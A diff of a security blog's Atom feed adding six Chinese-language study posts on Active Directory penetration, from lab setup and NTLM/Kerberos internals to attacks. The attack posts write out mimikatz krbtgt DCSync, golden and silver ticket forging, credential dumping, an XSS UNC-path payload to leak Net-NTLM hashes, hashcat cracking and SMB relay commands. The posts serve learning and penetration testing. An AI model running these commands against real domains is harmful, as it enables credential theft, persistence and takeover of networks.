@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://thekingofduck.github.io</id>
     <title>CoolCat&apos; Blog</title>
-    <updated>2020-02-29T11:16:11.357Z</updated>
+    <updated>2020-03-05T05:52:59.501Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://thekingofduck.github.io"/>
     <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
@@ -10,6 +10,513 @@
     <logo>https://thekingofduck.github.io/images/avatar.png</logo>
     <icon>https://thekingofduck.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, CoolCat&apos; Blog</rights>
+    <entry>
+        <title type="html"><![CDATA[域渗透学习笔记六：Kerbroes委派攻击及与NTLM Relay的组合]]></title>
+        <id>https://thekingofduck.github.io/post/ADStudy-Part-6-Kerbroes-Delegation-NTLM-Relay/</id>
+        <link href="https://thekingofduck.github.io/post/ADStudy-Part-6-Kerbroes-Delegation-NTLM-Relay/">
+        </link>
+        <updated>2020-03-04T14:49:41.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="基础知识">基础知识</h3>
+<blockquote>
+<p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p>
+</blockquote>
+<p>回顾正常的认证流程：</p>
+<p>KDC认证的部分</p>
+<p>1.用户告诉AD我是谁，AD给用户TGT。<br>
+2.用户拿着TGT并携带身份告诉AS我是谁，AS给用户TGS<br>
+3.用户拿着TGS要求访问服务，服务询问AS TGS是否存在。</p>
+<p>委派：<br>
+1.用户正常进行向KDC发起一次认证请求，KDC返回第一个TGS。<br>
+2.用户携带已有的TGS请求需要一个FTGT(Forwardable TGT),KDC返回一个FTGT。<br>
+3.用户携带已有的TGS告诉KDC需要一个能访问Service1的TGS，KDC返回能访问Service1的TGS1<br>
+4.用户携带FTGT以及能访问Service1的TGS1访问Service1。<br>
+5.Service1将用户携带过来的FTGT发送给KDC，并要求一个能访问Service2的TGS2，KDC返回TGS2给Service1。<br>
+6.Service1代表用户携带TGS2向Service2请求资源，Service2把资源返回给Service1<br>
+7.Servive1将自身资源与Service资源以并返回给用户。</p>
+<p>参考文章：<br>
+<a href="https://xz.aliyun.com/t/7217">Kerberos委派攻击</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[域渗透学习笔记五：攻击Kerbroes]]></title>
+        <id>https://thekingofduck.github.io/post/ADStudy-Part-5-Attack-Kerbroes/</id>
+        <link href="https://thekingofduck.github.io/post/ADStudy-Part-5-Attack-Kerbroes/">
+        </link>
+        <updated>2020-03-04T10:10:16.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="用户名遍历">用户名遍历</h3>
+<p>回顾Kerbroe的认证流程第一步：</p>
+<ul>
+<li>1.Client请求Kerberos服务(请求中包含了Client Name 也就是用户名)，如果主机名存在于ad中，就放回TGT给Client</li>
+</ul>
+<p>如果Web测试做的多就知道第一步就存在用户名遍历问题。</p>
+<p><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a></p>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583318637446.png" alt="" loading="lazy"></figure>
+<h3 id="票据伪造">票据伪造</h3>
+<h4 id="golden-ticket">Golden Ticket</h4>
+<p>AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的的来的，krbtgt用户的hash也是可以提取出来的，这就意味着ticket是可以自己计算出来的。Golden Ticket就是自己计算TGT去生成的TGS，换在买车票的比喻中就相当于伪造身份证去买票。</p>
+<p><strong>Golden Ticket价值和域控相似</strong></p>
+<p>伪造条件：</p>
+<ul>
+<li>Domain SID</li>
+<li>Domain name</li>
+<li>需要krbtgt用户的hash</li>
+<li>用户名随意</li>
+</ul>
+<p>伪造过程</p>
+<p>1.获取krbtgt hash</p>
+<pre><code>mimikatz &quot;lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt&quot; &quot;exit&quot; &gt; krbtgthash.txt
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583324821594.png" alt="" loading="lazy"></figure>
+<p>2.生成票据文件</p>
+<pre><code>mimikatz &quot;kerberos::golden /admin:CoolCat /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /krbtgt:b0164177afec62432418903208c1e247 /ticket:golden.kiribi&quot;  &quot;exit&quot;
+</code></pre>
+<p>其中sid最后一个“-”之后的要去掉，这个很细节。<br>
+<img src="https://thekingofduck.github.io/post-images/1583326167707.png" alt="" loading="lazy"></p>
+<p>3.将票据文件导入内存</p>
+<pre><code>mimikatz &quot;kerberos::purge&quot; &quot;kerberos::ptt golden.kiribi&quot; &quot;kerberos::list&quot; &quot;exit&quot;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583326531630.png" alt="" loading="lazy"></figure>
+<p>图中红线前后为导入金票前后的权限差异。</p>
+<p>值得一提的是目前这个金票只能在域内使用使用，不能跨域，涉及到跨域，域森林时该金票就被局限了，不过可以配合SIDHistory去生成包含根域的金票。</p>
+<p>可参考：http://t3ngyu.leanote.com/post/7697c6e55644</p>
+<h4 id="silver-tickets">Silver Tickets</h4>
+<p>已知目标机器的NTLM hash和域SID时，可以伪造任意用户访问目标机器上的指定服务。其过程不会与KDC通信，因此不会再KDC上留下任何痕迹，只会在目标机器和本机留下日志。可以利用的服务：</p>
+<table>
+<thead>
+<tr>
+<th>服务注释</th>
+<th>服务名称</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WMI</td>
+<td>HOST&amp;RPCSS</td>
+</tr>
+<tr>
+<td>Powershell Remoteing</td>
+<td>HOST&amp;HTTP</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST&amp;HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>LDAP、DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows File Share（CIFS）</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>Windows Remote Server Administration Tools</td>
+<td>RPCSS&amp;LDAP&amp;CIFS</td>
+</tr>
+</tbody>
+</table>
+<p>伪造条件</p>
+<ul>
+<li>
+<p>Domain SID</p>
+</li>
+<li>
+<p>Domain name</p>
+</li>
+<li>
+<p>目标机器的NTLM hash</p>
+</li>
+<li>
+<p>任意用户</p>
+<p>伪造过程：</p>
+<p>导出目标机器的hash：</p>
+<pre><code></code></pre>
+</li>
+</ul>
+<p>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot; &gt; hash.txt</p>
+<pre><code>
+![](https://thekingofduck.github.io/post-images/1583327211454.png)
+
+</code></pre>
+<p>mimikatz &quot;kerberos::golden /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /target:bot.adstudy.com /service:cifs /rc4:b0f256f8b3bca01555101864efef02ac /user:silver /ptt&quot; &quot;exit&quot;</p>
+<pre><code>![](https://thekingofduck.github.io/post-images/1583329253794.png)
+
+伪造成功后可使用klist查看票据,指令中伪造的服务是cifs，即Windows File Share（CIFS），在域内机器上测试的，本身就没限制，所以伪造了银票也没啥子用，就不截图了，如果伪造其他有权限限制机器上的服务即可越过限制。
+
+### 总结
+
+金票权限大，但是要过kdc，会留下日志。
+银票局限在特定服务内使用，不过kdc，只在域服务机器上留下日志。
+
+两者分别去读hash时都需要管理员权限，这是致命的缺陷，在攻击过程中就出现：
+
+&quot;有管理权限就可以直接读管理密码了，要金票银票何用？&quot;
+
+&gt; 可以用在权限维持上。
+
+参考文章：
+
+[域渗透-权限维持之 Silver Tickets](http://t3ngyu.leanote.com/post/Silver-Tickets)
+[域渗透-Ticket](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.md)
+
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[域渗透学习笔记四：域认证机制Kerbroes刨析]]></title>
+        <id>https://thekingofduck.github.io/post/ADStudy-Part-4-Kerbroes-Study/</id>
+        <link href="https://thekingofduck.github.io/post/ADStudy-Part-4-Kerbroes-Study/">
+        </link>
+        <updated>2020-03-04T04:12:18.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="基础知识">基础知识</h3>
+<p>Active Directory 活动目录，可以将其理解就是域服务。</p>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583199291763.PNG" alt="" loading="lazy"></figure>
+<p>负责域内机器管理，用户管理，资源管理，桌面配置，应用支撑等等。</p>
+<p><strong>Kerbroes的特点：</strong></p>
+<ul>
+<li>不依赖于主机认证。</li>
+<li>不怕中间人攻击。</li>
+<li>使用密钥系统提供认证服务。</li>
+</ul>
+<p><strong>参与的角色</strong></p>
+<ul>
+<li>
+<p>Client</p>
+</li>
+<li>
+<p>Server</p>
+</li>
+<li>
+<p>KDC（Key Distribution Center 密钥分发中心）</p>
+<p>(小结：性质类似于Web中的session)</p>
+</li>
+</ul>
+<p>细分<strong>KDC中的角色</strong>：</p>
+<ul>
+<li>AD: account database的缩写，其储存了Client白名单，只有在白名单内的Client才能申请TGT</li>
+<li>AS：Authentication Service的缩写，验证Client端的身份并为Client生成TGT的服务器</li>
+<li>TGS：Ticket Cranting Service的缩写，为Client生成指定服务ticket。</li>
+</ul>
+<p><strong>物理层面AD和KDC都是域控</strong></p>
+<h3 id="kerbroes认证分析">Kerbroes认证分析</h3>
+<p>从KDC的参与角色中可以了解到认证分为三块六小步，即一发一收的三个来回。</p>
+<ul>
+<li>1.Client请求Kerberos服务(请求中包含了Client Name 也就是用户名)，如果主机名存在于ad中，就放回TGT给Client</li>
+<li>2.Client拿着TGT去向Kerbroes发起请求说需要指定服务的权限，AS返回Ticket给Client。</li>
+<li>3.Client拿着Ticket去请求登录服务，服务那边又会去问Kerbroes这个ticket是否是真实的，是就给通过，认证完成。</li>
+</ul>
+<p>引用一张其他师傅画好的比喻图</p>
+<figure data-type="image" tabindex="2"><img src="https://camo.githubusercontent.com/ff275187a475867d6d59773793706b7e26de54eb/68747470733a2f2f696d6167652e333030312e6e65742f696d616765732f32303139303232322f313535303830383234305f356336663734623030363530652e706e67" alt="" loading="lazy"></figure>
+<p>个人的理解是这样</p>
+<p>将Kerbroes比作购票APP。认证流程比作买票。</p>
+<ul>
+<li>1.首先你使用身份证(Client name)去购票APP进行注册，购票APP需要核实你是我国公民。不是就直接拒绝(Client Name没再AD白名单中)，没有后续，是公民，但是上了征信黑名单也拒绝。(Client在AD中，但是是在黑名单中)，正常通过后就发放一个账号给你（TGT）</li>
+<li>
+<ol start="2">
+<li>使用账号(TGT)发起买去xxxx的票的请求，买完APP返回了一张去xxxx的票给你(访问指定server的TGS)</li>
+</ol>
+</li>
+<li>拿到票后去车站坐车，乘务员会对你的票进行检验，查看是否为真实的票据。</li>
+</ul>
+<h4 id="抓包分析">抓包分析</h4>
+<p>以下为域用户登录认证包</p>
+<p><strong>TGT获取</strong></p>
+<ul>
+<li>AS-REQ：</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583301307789.png" alt="" loading="lazy"></figure>
+<p>Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</p>
+<p>AS-REP</p>
+<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583301478916.png" alt="" loading="lazy"></figure>
+<p>KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据</p>
+<p><strong>TGS获取</strong></p>
+<p>TGS-REQ</p>
+<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583302306281.png" alt="" loading="lazy"></figure>
+<p>请求访问指定服务</p>
+<p>TGT-REP</p>
+<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1583302418203.png" alt="" loading="lazy"></figure>
+<p>返回Ticket。(这里没分析清楚)</p>
+<p><strong>TGS登录服务</strong></p>
+<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583303413428.png" alt="" loading="lazy"></figure>
+<p>涉及字段比较多，每个字段得含义分析不清楚，查阅资料可以看到详细流程如下：</p>
+<pre><code>AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳
+AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。
+TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求
+TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)
+AP_REQ: Client拿着TGS票据去请求服务
+AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。
+</code></pre>
+<p>分析得贼仔细，太强了。</p>
+<h3 id="总结">总结</h3>
+<p>分析完Kerbroes认证流程后不难理解为什么NTLM协议的质询阶段很多师傅都是分析错的了,没动手抓包分析国，光看理论把Kerbroes和NTLM认证混淆了。</p>
+<p>参考资料</p>
+<p><a href="https://www.cnblogs.com/sup3rman/archive/2020/02/18/12329222.html">内网学习之Kerberos协议</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[域渗透学习笔记三：攻击NTLM]]></title>
+        <id>https://thekingofduck.github.io/post/ADStudy-Part-3-Attack-NTLM/</id>
+        <link href="https://thekingofduck.github.io/post/ADStudy-Part-3-Attack-NTLM/">
+        </link>
+        <updated>2020-03-04T02:40:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="基础知识">基础知识</h3>
+<p>最常见Pass The Hash 也就是Hash传递这一手法是就是利用Net-NTLM hash进行攻击的，仔细分析过Windows认证机制机制后会发现它就类似与一个web方面的重放攻击。</p>
+<p>比如：</p>
+<blockquote>
+<p>在一些条件下通过中间人抓到了站点登录后台登录时的Web流量，但是登录密码被前端加密了（比如MD5），hash值无法解密，这时候我们只需要重放这个登陆包就可以完成后台登录认证。</p>
+</blockquote>
+<p>在Net-NTLM认证过程中Net-NTLM hash传递发生在质询第二个包：</p>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583251221865.png" alt="" loading="lazy"></figure>
+<p>里面最关键的字段是用户名以及Response。缺一不可，所以原则上来说进行Hash传递的条件有两:</p>
+<ul>
+<li>
+<p>抓到的Net-NTLM hash字段</p>
+</li>
+<li>
+<p>hash对应的用户名。</p>
+<p>个人不觉得能访问目标算条件，不能访问目标或者访问错误的目标想去搞Hash传递攻击本身就是个扯犊子的事情，就像Web重放一样，A站点的包你去重放给截然不同的B本身就很扯。关于协议版本对的上也是个人的总结，因为Net-NTLM协议在不同的版本上又可细分为NTLM v1，NTLMv2，NTLM session v2三种协议，不同协议使用不同格式的Challenge和加密算法。v1和v2在windows认证机制的学习中以及提到过其不同的地方。</p>
+</li>
+</ul>
+<h3 id="net-ntlm-hash窃取">Net-NTLM Hash窃取</h3>
+<p>相关Hash会出现三个地方：</p>
+<ul>
+<li>
+<p>SAM数据库</p>
+</li>
+<li>
+<p>Lsass进程</p>
+</li>
+<li>
+<p>传输过程</p>
+<p>前两点已经做过总结：<a href="https://blog.gzsec.org/post/Dumping-Windows-Local-Credentials-Tools/">Windows本地hashdump备忘录</a>, 各类之所以能够读到明文时因为去dump了lsass中缓存的用户输入得到明文，如果明文缓存不存在的情况下（比如2012/10以后系统wdigest默认没开启，明文不存在），读到的其实可以理解为都是NTLM hash。值得注意的是：</p>
+<ul>
+<li>Net-NTLM hash和NTLM hash不是一回事。</li>
+<li>Net-NTLM hash是Net-NTLM认证过程客户端第二次发送给服务端的包中的response字段。</li>
+</ul>
+</li>
+</ul>
+<p>了解完成就会明白Net-NTLM hash的窃取主要发生在传输环节，传输环节的攻击无非三个点。</p>
+<p>第一是传输前就截取到数据包，类似与Hook app的发包接口获取明文<br>
+第二是中间人攻击获取<br>
+第三是在接收方获取。</p>
+<p>第一个环节明显需要以及有对方能够控制底层流量权限，既然有了还搞啥Hash传递；第二个环节不少很了解，后续再学习；第三个环节需要接收方获取，通常情况下是控到刚好会被目标使用NILM认证访问的几率是很小的。不过可以伪造NTLM认证服务端，再配合其他漏洞进行利用。</p>
+<p>比如XSS：</p>
+<pre><code>&lt;img src=&quot;\\10.5.100.7\TheKingOfDuck.png&quot;&gt;
+</code></pre>
+<p>img标签是支持smb协议，然后smb协议本质上走的NTLM认证，NTLM认证在用户输入凭证前又会默认使用本地NTLM Hash先进行认证一遍，所以在无法Getshell的情况下，就可以伪造一个smb客户端，再通过该手法获取到Net-NTLM Hash，最后执行解密工作或hash传递攻击</p>
+<p><strong>Responder伪造认证服务端</strong>：</p>
+<p>伪造一个Net-NTLM协议认证服务端，当用户进行访问时系统默认会先将本地Net-NTLM hash进行验证，该hash可进行碰撞解密获取密码。</p>
+<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583305815079.png" alt="" loading="lazy"></figure>
+<p>在目标机器上访问伪造的客户端(可以是多种形式，比如上面说到的xss获取)</p>
+<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583305985478.png" alt="" loading="lazy"></figure>
+<p>获得Net-NTLM hash：</p>
+<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583306002981.png" alt="" loading="lazy"></figure>
+<p>同类工具还有<a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>,原理都是一样的</p>
+<h3 id="net-ntlm-hash-利用">Net-NTLM Hash 利用</h3>
+<p><strong>Net-NTLMv1 Hash加密策略远弱于v2，拿到Net-NTLM v1 hash就约等于NTLM HASH，v2在暴力破解不成功的情况下就可以考虑Relay攻击</strong></p>
+<h4 id="net-ntlm-v2-hash暴力破解">Net-NTLM v2 hash暴力破解</h4>
+<p>将Responder获取到的Net-NTLM hash交给hashcat进行暴力破解</p>
+<pre><code>hashcat -m 5600 attacker::ADSTUDY:1aef20d3cfba8772:9D01310D04E79AD84A789669BE40EF2C:0101000000000000D9C9E307FDF1D5014454D6B4C6B563920000000002000E0041004400530054005500440059000100060042004F0054000400160061006400730074007500640079002E0063006F006D0003001E0062006F0074002E0061006400730074007500640079002E0063006F006D000500160061006400730074007500640079002E0063006F006D0007000800D9C9E307FDF1D50106000400020000000800300030000000000000000000000000200000D6F78567C955B9EA05E044A994D2307E6DEF8486F2ECA33C9F042A0F501043C10A001000000000000000000000000000000000000900200063006900660073002F00310030002E0035002E003100300030002E0031003000000000000000000000000000 pass.txt --force
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583310530278.png" alt="" loading="lazy"></figure>
+<p>如图是暴力破解成功的情况。</p>
+<h4 id="net-ntlm-v2-hash-relay">Net-NTLM v2 hash Relay</h4>
+<p>以relay2smb为例：</p>
+<figure data-type="image" tabindex="6"><img src="https://camo.githubusercontent.com/ac10e8dc32ccc3ce85bc42d7b06472da2dfc0690/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303139303631333135333532383238332e706e673f782d6f73732d70726f636573733d696d6167652f77617465726d61726b2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33647a4d544d784d6a6b3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730" alt="" loading="lazy"></figure>
+<p>利用条件有两：</p>
+<ul>
+<li>
+<p>目标机器不能开启smb签名，否则利用无效,一般情况下,windows server会默认开启,而windows单机系统[win 7/8/8.1/10]默认都不会开。</p>
+</li>
+<li>
+<p>对一些打了ms08-068[KB957097]补丁的老系统[比如windows xp/2003以下的系统]利用无效。</p>
+<p><strong>值得一提的是域控默认开启smb签名的,其他默认没开</strong></p>
+<p>relay对象10.5.100.7 (win7)<br>
+攻击机10.5.100.10 （Kali）<br>
+relay到 10.5.100.1 （2012）</p>
+<p>在kali 使用nmap来检查签名是否开启，smbrelayx.py模块来发起relay攻击</p>
+<pre><code>nmap -Pn -sT -p 445 --open --script smb-security-mode,smb-os-discovery 10.5.100.7
+</code></pre>
+</li>
+</ul>
+<p><img src="https://thekingofduck.github.io/post-images/1583313947570.png" alt="" loading="lazy"><br>
+（message_signing: disabled 即可，Responder自带的Runfinger也可以，不用检查也可以，Multirelay也会自动检查的）</p>
+<p>在kali上开启relay</p>
+<pre><code>python smbrelayx.py -h 192.168.22.162 -c whoami
+</code></pre>
+<p>在2012上执行</p>
+<pre><code>dir \\10.5.100.10\C$
+</code></pre>
+<p>即可relay成功。</p>
+<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583332013078.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1583332020524.png" alt="" loading="lazy"></figure>
+<h3 id="总结">总结</h3>
+<p>大多数情况攻击NTLM能成功都是因为NTLM在认证是默认会先使用本地hash去登录目标服务，因此可以制造各种机会去获取到Net-NTLM hash再进一步解密操作。</p>
+<ul>
+<li>
+<p>Net-NTLM v1 hash相对容易破解，拿到就约等于拿到了NTLM hash</p>
+</li>
+<li>
+<p>Net-NTLM v2 hash需要暴力破解</p>
+</li>
+<li>
+<p>NTLM-Relay 攻击的姿势很多，工具也多，msf/smbrelayx.py/Responder</p>
+</li>
+<li>
+<p>触发让系统发送NTLM请求的地方非常多。因为很多地方都支持UNC路径</p>
+</li>
+</ul>
+<p>比如：</p>
+<ul>
+<li>xss</li>
+<li>各种图标（desktop.ini,scf文件，用户头像）</li>
+<li>pdf/word</li>
+<li>outlook</li>
+<li>xxe/ssrf</li>
+<li>etc...</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[域渗透学习笔记二：Windows认证机制Net-NTLM刨析]]></title>
+        <id>https://thekingofduck.github.io/post/ADStudy-Part-2-Net-NTLM-Study/</id>
+        <link href="https://thekingofduck.github.io/post/ADStudy-Part-2-Net-NTLM-Study/">
+        </link>
+        <updated>2020-03-02T04:09:31.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>基础知识</strong></p>
+<p>1.Windows本地认证：</p>
+<p>认证的密码储存在SAM文件中，其位置为C:/Windows/system32/config/sam，词组security account manager,意思是安全账号管理器，其作用是对windows账户安全管理，类似于linux系统中的/etc/passwd文件,删除该文件即可删除账号密码。这也是PE破解系统密码的原理。</p>
+<p>登录认证是会从该文件读取里面的加密后的密码(NTLM hash)和用户输入的密码进行对比。</p>
+<p>NTLM hash生成流程如下：</p>
+<ul>
+<li>
+<p>将明文口令转换成十六进制的格式</p>
+</li>
+<li>
+<p>转换成Unicode格式，即在每个字节之后添加0x00</p>
+</li>
+<li>
+<p>对Unicode字符串作MD4加密，生成32位的十六进制数字串</p>
+<p>NTLM hash支持Net NTLM认证协议以及本地认证协议。其前身为LM Hash(LM算法脆弱，响应存在一些缺陷。主要出现在xp，03之下的系统)</p>
+</li>
+</ul>
+<p>Net-NTLM认证流程：</p>
+<ul>
+<li>协商：主要用于确认双方协议版本</li>
+<li>质询：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴。</li>
+<li>验证：验证主要是在质询完成后，验证结果，是认证的最后一步。</li>
+</ul>
+<p>质询的完整过程：</p>
+<ul>
+<li>1.客户端向服务器端发送用户信息(用户名)请求</li>
+<li>2.服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1。生成一 个Net-NTLM Hash存在内存中，同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。</li>
+<li>3.客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</li>
+</ul>
+<p>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。</p>
+<p>验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。</p>
+<p>注意:</p>
+<p>1.Chanllenge是Server产生的一个16字节的随机数，每次认证都不同<br>
+2.Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。<br>
+3.SMB走的也是Net-NTLM协议。</p>
+<p>以上属于Net-NTLM v2协议的详细流程<br>
+Net-NTLMv1的加密流程如下：</p>
+<ul>
+<li>1.客户端向服务器发送一个请求</li>
+<li>2.服务器接收到请求后，生成一个8位的Challenge，发送回客户端</li>
+<li>3.客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器</li>
+<li>4.服务器校验response<br>
+两者的流程可以说是相同的，但加密算法不同，后者Net-NTLMv1相对脆弱</li>
+</ul>
+<p><strong>质询抓包分析</strong></p>
+<p>使用域户向域控共享目录发起请求，<br>
+<img src="https://thekingofduck.github.io/post-images/1583247680147.png" alt="" loading="lazy"></p>
+<p>在域用户机器上Wireshark抓包如下：</p>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583250718347.png" alt="" loading="lazy"></figure>
+<p>步骤上质询有四步,可以将其看为一发一收两个来回</p>
+<p>第一发：基础信息发送</p>
+<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583250826048.png" alt="" loading="lazy"></figure>
+<p>第一收：获取对方生成并发过来的Challenge</p>
+<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583250919881.png" alt="" loading="lazy"></figure>
+<p>第二发：将要登录到账户对应的NTLM Hash加密Challenge生成Response并发给服务器</p>
+<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583251221865.png" alt="" loading="lazy"></figure>
+<p>第二收：服务器校验response并返回结果</p>
+<p><img src="https://thekingofduck.github.io/post-images/1583251428310.png" alt="" loading="lazy"><br>
+（登录成功）<br>
+<img src="https://thekingofduck.github.io/post-images/1583251781830.png" alt="" loading="lazy"><br>
+（登录失败）</p>
+<p>至此Net-NTLM协议通讯过程分析完成，也可以看到文章<a href="https://xz.aliyun.com/t/1943">NTLM hash和Net-NTLM hash介绍</a>0x03 Net-NTLM hash中的分析是错误的。</p>
+<p>有个非常值得关注的点：</p>
+<ul>
+<li><strong>当用户进行涉及Net-NTLM认证的访问时系统默认会先将本地NTLM hash去走一遍Net-NTLM验证。</strong></li>
+</ul>
+<p>NTLM本地认证流程：</p>
+<blockquote>
+<p>winlogon.exe -&gt; 接收用户输入<br>
+lsass.exe -&gt; 认证</p>
+</blockquote>
+<hr>
+<p><strong>工作组认证和域环境认证的区别：</strong></p>
+<p>工作组：点对点交易，无法相互信任。<br>
+域环境：有信托机构(域)，相当于闲鱼卖东西需要闲鱼官方担保。</p>
+<p>参考资料：</p>
+<p><a href="https://www.bilibili.com/video/av65934941?from=search&amp;seid=9042861733006388518">彻底理解Windows认证</a><br>
+<a href="https://xz.aliyun.com/t/1943">NTLM hash和Net-NTLM hash介绍</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[域渗透学习笔记一：域环境的搭建]]></title>
+        <id>https://thekingofduck.github.io/post/ADStudy-Part-1-AD-Install/</id>
+        <link href="https://thekingofduck.github.io/post/ADStudy-Part-1-AD-Install/">
+        </link>
+        <updated>2020-03-01T22:50:43.000Z</updated>
+        <content type="html"><![CDATA[<p>域渗透从0开始重新学习的第一天。<br>
+台式机上是win10系统，VM里之前已经安装了2008和2012，再添加一台win7，计划用2012当域控，2008跑服务，win7做主要靶跳板。</p>
+<p>win7是刚刚装的比较干净的机器，2008上有360，2012上有卡巴。</p>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583198313108.PNG" alt="" loading="lazy"></figure>
+<p>在2012上配置网络：</p>
+<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583198433041.PNG" alt="" loading="lazy"></figure>
+<p>本地抗不住同时开太多的机器，DNS服务器放到域控上，所以dns解析指向本机，其他机器的DNS也是指向这个IP。</p>
+<p>使用10.5.100.0/24这个段是因为学校内网用的这个段，日习惯了。。。</p>
+<p>修改计算机名：</p>
+<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583198849620.PNG" alt="" loading="lazy"></figure>
+<p>计算机名不能为存数字,修改为重启一下。</p>
+<p>在服务器管理的“添加角色与功能”菜单中中添加AD域名服务和DNS服务器两项功能。</p>
+<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583199291763.PNG" alt="" loading="lazy"></figure>
+<p>选完一路点击下一步即可。</p>
+<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583199504208.PNG" alt="" loading="lazy"></figure>
+<p>安装完关闭再点服务器管理就有下图：</p>
+<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1583199627145.PNG" alt="" loading="lazy"></figure>
+<p>多了刚刚添加的两项功能。</p>
+<p>升级为2012为域控：</p>
+<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583202560692.png" alt="" loading="lazy"></figure>
+<p>设置域：</p>
+<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1583202843342.png" alt="" loading="lazy"></figure>
+<p>设置目录还原密码：</p>
+<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/1583202864621.png" alt="" loading="lazy"></figure>
+<p>一路下一步然后确认安装即可，中图会有感叹号提示无法创建该DNS服务器委派, 无关痛痒。</p>
+<p>安装完自动重启：</p>
